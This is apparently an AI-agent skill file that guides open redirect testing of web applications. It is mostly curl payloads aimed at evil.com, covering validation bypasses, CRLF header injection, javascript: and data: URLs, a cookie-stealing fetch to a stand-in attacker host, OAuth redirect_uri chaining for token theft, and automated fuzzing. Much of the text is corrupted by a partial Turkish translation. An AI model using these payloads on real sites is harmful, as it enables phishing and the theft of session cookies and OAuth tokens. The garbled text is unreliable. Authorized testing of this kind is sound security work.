---
name: testing-for-open-redirect-vulnerabilities
description: Identify and test open redirect vulnerabilities in web applications by analyzing URL redirection parameters, bypass techniques, and exploitation chains for phishing and token theft.
tags:
- redirect-bypass
- open-redirect
- owasp
- phishing
- url-validation
- fetih
- web-application-security
- cybersecurity
- unvalidated-redirect
- siber-güvenlik
- url-redirect
triggers:
- CSRF
- SQL injection
- XSS
- alert
- authentication
- endpoint
- exploit
- http
- log
- open
- phishing
- redirect
category: web-application-security
source_subdomain: web-application-security
nist_csf:
- PR.PS-01
- ID.RA-01
- PR.DS-10
- DE.CM-01
adapted_for: fetih
---

# Testing for Open Redirect Vulnerabilities


## Ne Zaman Kullanılır
- testing yaparken login/logout flows that redirect users to specified URLs
- During assessment of OAuth authorization endpoints with redirect_uri parameters
- auditing yaparken applications with URL parameters (next, url, redirect, return, goto, target)
- During phishing simulation to chain open redirects with credential harvesting
- testing yaparken SSO implementations for redirect validation weaknesses

## Ön Gereksinimler
- Burp Suite or OWASP ZAP for intercepting redirect requests
- Collection of open redirect bypass payloads
- External domain or Burp Collaborator for redirect confirmation
- Understanding of URL parsing and encoding schemes
- Browser with developer tools for observing redirect chains
- Bilgi: HTTP 301/302/303/307/308 redirect status codes


> **Legal Notice:** bu skill is for authorized security testing and educational purposes only. Unauthorized use against systems you do not own or have written permission to test is illegal and may violate computer fraud laws.

## İş Akışı

### Adım 1 — Identify Redirect Parameters
```bash


curl -v "http://target.com/login?next=https://evil.com"
curl -v "http://target.com/logout?redirect=https://evil.com"
curl -v "http://target.com/oauth/authorize?redirect_uri=https://evil.com"
```

### Adım 2 — Test Basic Open Redirect Payloads
```bash
curl -v "http://target.com/redirect?url=https://evil.com"

curl -v "http://target.com/redirect?url=//evil.com"

curl -v "http://target.com/redirect?url=https://target.com@evil.com"

curl -v "http://target.com/redirect?url=https://evil.com\@target.com"

curl -v "http://target.com/redirect?url=https://evil.com%00.target.com"
```

### Adım 3 — Apply Validation Bypass Techniques
```bash
curl -v "http://target.com/redirect?url=https://target.com.evil.com"
curl -v "http://target.com/redirect?url=https://evil.com/target.com"

curl -v "http://target.com/redirect?url=https%3A%2F%2Fevil.com"
curl -v "http://target.com/redirect?url=%68%74%74%70%73%3a%2f%2f%65%76%69%6c%2e%63%6f%6d"

curl -v "http://target.com/redirect?url=%2568%2574%2574%2570%253A%252F%252Fevil.com"

curl -v "http://target.com/redirect?url=HtTpS://evil.com"

curl -v "http://target.com/redirect?url=%0d%0aLocation:%20https://evil.com"

curl -v "http://target.com/redirect?url=javascript:alert(document.domain)"

curl -v "http://target.com/redirect?url=data:text/html,<script>alert(1)</script>"
```

### Adım 4 — Test Path-Based Redirects
```bash
curl -v "http://target.com/redirect?url=/\evil.com"
curl -v "http://target.com/redirect?url=/.evil.com"

curl -v "http://target.com/redirect?url=/../../../evil.com"

curl -v "http://target.com/redirect?url=https://evil.com#target.com"

curl -v "http://target.com/redirect?url=https://target.com&url=https://evil.com"
```

### Adım 5 — Chain with Other Vulnerabilities
```bash
curl -v "http://target.com/oauth/authorize?client_id=CLIENT&redirect_uri=http://target.com/redirect?url=https://evil.com&response_type=code"


curl -v "http://target.com/redirect?url=javascript:fetch('https://evil.com/?c='+document.cookie)"
```

### Adım 6 — Automate Open Redirect Testing
```bash
python3 openredirex.py -l urls.txt -p payloads.txt --keyword FUZZ

cat urls.txt | gf redirect | sort -u > redirect_params.txt

echo "http://target.com" | nuclei -t http/vulnerabilities/generic/open-redirect.yaml

ffuf -w open-redirect-payloads.txt -u "http://target.com/redirect?url=FUZZ" -mr "Location: https://evil"
```

## Key Concepts

| Concept | Description |
|---------|-------------|
| Unvalidated Redirect | Application redirects to user-supplied URL without checking destination |
| URL Parsing Inconsistency | Different libraries parse URLs differently, enabling bypass |
| Protocol-Relative URL | Using // prefix to redirect while inheriting current protocol |
| Userinfo Abuse | Using @ symbol to make URL appear to belong to trusted domain |
| Open Redirect Chain | Combining multiple open redirects or chaining with other vulnerabilities |
| DOM-Based Redirect | Client-side JavaScript performing redirect using attacker-controlled input |
| Meta Refresh Redirect | HTML meta tag performing redirect without server-side 302 |

## Tools & Systems

| Tool | Purpose |
|------|---------|
| OpenRedireX | Automated open redirect vulnerability testing tool |
| Burp Suite | HTTP proxy for intercepting and modifying redirect parameters |
| gf (tomnomnom) | Pattern matcher to extract redirect parameters from URL lists |
| nuclei | Template-based scanner with open redirect Tespit templates |
| ffuf | Fuzzer for mass-testing redirect parameter payloads |
| OWASP ZAP | Automated scanner with open redirect Tespit |

## Common Scenarios

1. **Phishing Amplification** — Use open redirect on a trusted domain to lend credibility to phishing URLs targeting users
2. **OAuth Token Theft** — Exploit open redirect as redirect_uri in OAuth flows to steal authorization codes and access tokens
3. **SSO Bypass** — Redirect SSO authentication responses to attacker-controlled servers to capture session tokens
4. **XSS via Redirect** — Chain open redirect with javascript: protocol to achieve cross-site scripting
5. **Referer Leakage** — Use open redirect to leak sensitive tokens in Referer headers redirecting yaparken to external sites

## Output Format

```
## Open Redirect Assessment Report
- **Target**: http://target.com
- **Vulnerable Parameters Found**: 3
- **Bypass Techniques Required**: URL encoding, userinfo abuse

### Bul:ings
| # | Endpoint | Parameter | Payload | Impact |
|---|----------|-----------|---------|--------|
| 1 | /login | next | //evil.com | Phishing |
| 2 | /oauth/authorize | redirect_uri | https://target.com@evil.com | Token Theft |
| 3 | /logout | return | https://evil.com%00.target.com | Session Redirect |

### İyileştirme
- Implement allowlist of permitted redirect destinations
- Validate redirect URLs server-side using strict URL parsing
- Reject any redirect URL containing external domains
- Use indirect reference maps instead of direct URL parameters
```

<!--
  ⚔ Bu skill FETIH AI Agent icin gelistirilmistir — https://github.com/MustafaKemal0146/fetih
  Yetkisiz kullanim/kopyalama tespit edilebilir.
  hash: e4935b35dace0bbd
-->

